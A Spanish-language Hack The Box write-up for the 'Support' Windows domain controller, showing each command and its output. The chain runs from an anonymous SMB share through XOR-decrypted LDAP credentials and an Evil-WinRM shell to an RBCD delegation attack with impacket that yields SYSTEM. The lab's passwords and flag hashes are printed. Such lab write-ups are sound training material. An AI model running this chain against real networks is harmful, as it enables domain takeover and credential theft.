# HTB — Support

<div align="center">

| Campo | Valor |
|-------|-------|
| **OS** | Windows Server 2022 |
| **Dificultad** | Easy |
| **Categoría** | Active Directory |
| **IP** | 10.129.34.198 |
| **Fecha** | Abril 2026 |

</div>

---

## Attack Path

```
SMB Null Session
    └── support-tools share (anónimo)
        └── UserInfo.exe.zip
            └── strings -e → credenciales LDAP ofuscadas
                └── XOR decrypt → ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
                    └── ldapsearch → campo info → support:Ironside47pleasure40Watchful
                        └── Evil-WinRM → shell como support
                            └── BloodHound → GenericAll sobre DC$
                                └── RBCD Attack → SYSTEM
```

---

## 1. Reconocimiento

### Host Discovery

```bash
ping -c 1 10.129.34.198
# 64 bytes from 10.129.34.198: icmp_seq=1 ttl=127 time=180 ms

whichSystem.py 10.129.34.198
# 10.129.34.198 (ttl -> 127): Windows
```

TTL=127 indica Windows (TTL inicial 128, reducido en 1 por un salto de red).

### Port Scanning

```bash
# Escaneo sigiloso — todos los puertos
nmap -sS -p- --open --min-rate 5000 -Pn -n 10.129.34.198 -oG allports

# Escaneo de versiones y scripts — puertos clave
nmap -sCV -p 53,88,135,139,389,445,464,5985,9389 -Pn 10.129.34.198 -oN targeted
```

**Resultados:**

| Puerto | Servicio | Info |
|--------|----------|------|
| 53/tcp | DNS | Simple DNS Plus |
| 88/tcp | Kerberos | Microsoft Windows Kerberos |
| 135/tcp | MSRPC | Microsoft RPC |
| 389/tcp | LDAP | Domain: **support.htb** |
| 445/tcp | SMB | Signing required |
| **5985/tcp** | **WinRM** | **Microsoft HTTPAPI 2.0 ← clave** |
| 9389/tcp | ADWS | .NET Message Framing |

La combinación 53+88+389+445 confirma Domain Controller. El puerto **5985 (WinRM)** será el vector de acceso una vez obtenidas credenciales.

```bash
echo "10.129.34.198  support.htb  dc.support.htb" | sudo tee -a /etc/hosts
```

---

## 2. Enumeración

### SMB — Null Session

```bash
smbclient -L //10.129.34.198 -N
```

```
Sharename       Type    Comment
---------       ----    -------
ADMIN$          Disk    Remote Admin
C$              Disk    Default share
IPC$            IPC     Remote IPC
NETLOGON        Disk    Logon server share
support-tools   Disk    support staff tools   ← NO estándar
SYSVOL          Disk    Logon server share
```

El share `support-tools` no es estándar en un DC. Accedemos con sesión anónima:

```bash
smbclient //10.129.34.198/support-tools -N
smb: \> dir
```

```
7-ZipPortable_21.07.paf.exe    2.8 MB    28 May 2022
npp.8.4.1.portable.x64.zip     5.4 MB    28 May 2022
putty.exe                      1.2 MB    28 May 2022
SysinternalsSuite.zip           48 MB    28 May 2022
UserInfo.exe.zip               277 KB    20 Jul 2022   ← sospechoso
windirstat1_1_2_setup.exe       79 KB    28 May 2022
WiresharkPortable64_3.6.5       44 MB    28 May 2022
```

`UserInfo.exe.zip` destaca por su nombre, tamaño reducido y fecha posterior al resto.

```bash
smb: \> get UserInfo.exe.zip
```

---

## 3. Análisis del Binario

### Extracción de strings

```bash
unzip UserInfo.exe.zip

# Strings Unicode — efectivo en binarios .NET
strings -e l UserInfo.exe
strings -e b UserInfo.exe
```

**Hallazgos:**

```
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E   # password ofuscada
armando                                              # clave XOR
LDAP://support.htb                                   # servidor
support\ldap                                         # usuario
```

### Desencriptación XOR

Al analizar el código descompilado, la rutina de cifrado usa XOR + Base64 con `armando` como clave y `0xDF` como sal:

```python
import base64

enc_password = b'0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E'
key = b'armando'

array = base64.b64decode(enc_password)
key_repeated = (key * (len(array) // len(key) + 1))[:len(array)]
result = bytes([a ^ b ^ 0xDF for a, b in zip(array, key_repeated)])

print(result.decode())
# nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

**Credenciales obtenidas:**

| Usuario | Password |
|---------|----------|
| `support\ldap` | `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` |

```bash
netexec smb 10.129.34.198 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb
# [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

### Enumeración LDAP

Con acceso autenticado, consultamos el campo `info` del usuario support:

```bash
ldapsearch -x -H ldap://10.129.34.198 \
  -D 'support\ldap' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' \
  '(sAMAccountName=support)' info

# dn: CN=support,CN=Users,DC=support,DC=htb
# info: Ironside47pleasure40Watchful
```

**Credenciales finales:**

| Usuario | Password |
|---------|----------|
| `support\support` | `Ironside47pleasure40Watchful` |

---

## 4. Foothold

```bash
netexec winrm 10.129.34.198 -u 'support' -p 'Ironside47pleasure40Watchful' -d support.htb
# [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)

evil-winrm -i 10.129.34.198 -u 'support' -p 'Ironside47pleasure40Watchful'
# Evil-WinRM shell v3.5
# *Evil-WinRM* PS C:\Users\support\Documents>
```

```
user.txt → 90ff758144e77feda1f79734e57b8abf
```

---

## 5. Privilege Escalation — RBCD Attack

### Reconocimiento AD

```bash
whoami /groups
# SUPPORT\Shared Support Accounts   ← grupo no estándar

bloodhound-python -u 'support' -p 'Ironside47pleasure40Watchful' \
  -d support.htb -ns 10.129.34.198 -c All
```

BloodHound revela que el grupo `Shared Support Accounts` tiene **GenericAll** sobre el objeto `DC$`.

### ¿Por qué funciona RBCD?

Con `GenericAll` sobre el DC podemos modificar el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity`, configurando al DC para que confíe en una cuenta de máquina que nosotros controlamos. Esto permite solicitar un ticket Kerberos como Administrator mediante S4U2Self/S4U2Proxy.

### Ejecución

```bash
# 1. Crear cuenta de máquina falsa
impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' \
  -computer-name 'FAKE$' -computer-pass 'Password123!' -dc-ip 10.129.34.198
# [*] Successfully added machine account FAKE$ with password Password123!

# 2. Configurar delegación (desde evil-winrm)
Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount FAKE$

# 3. Solicitar ticket como Administrator
impacket-getST support.htb/FAKE$:'Password123!' \
  -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.34.198
# [*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache

# 4. Usar el ticket
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-psexec -k -no-pass support.htb/Administrator@dc.support.htb
# C:\Windows\system32>
```

```
root.txt → d0b25369aadbc499f993e59be095b5ee
```

---

## 6. Resumen

| Paso | Técnica | Resultado |
|------|---------|-----------|
| Recon | TTL fingerprinting | Windows Server 2022 |
| Enum | SMB null session | Share `support-tools` expuesto |
| Analysis | strings -e en binario .NET | Credenciales LDAP ofuscadas |
| Decrypt | XOR + Base64 con clave `armando` | `ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` |
| Enum | LDAP autenticado | `support:Ironside47pleasure40Watchful` en campo `info` |
| Foothold | Evil-WinRM (puerto 5985) | Shell como `support` |
| PrivEsc | RBCD attack vía GenericAll sobre DC$ | SYSTEM |

---

*Hack The Box — Support · Pwned by [Nacho-Sudo](https://github.com/Nacho-Sudo) · Abril 2026*
